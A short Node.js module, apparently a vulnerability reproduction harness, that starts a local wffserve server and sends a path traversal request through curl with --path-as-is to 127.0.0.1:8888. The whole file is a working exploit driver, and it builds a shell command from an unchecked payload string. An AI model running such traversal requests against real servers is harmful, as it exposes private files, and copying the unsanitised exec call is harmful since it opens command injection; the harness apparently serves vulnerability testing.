function exploitFunction(payload) {
    const path = require("path");
    const { sleep } = require("sleep");
    const fs = require("fs");

    let hostsFile = fs.readFileSync(path.resolve(__dirname, payload)).toString();

    let server = "node ./node_modules/wffserve/index.js";
    let exe = require("child_process").exec(server, (error, stdout) => {});

    sleep.sleep(2);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

    return new Promise((resolve, reject) => {
        require("child_process").exec(attack_string, (error, stdout) => {
            if (error) {
                reject(error);
            } else {
                resolve(stdout);
            }
        });
    });
}

module.exports = { exploitFunction };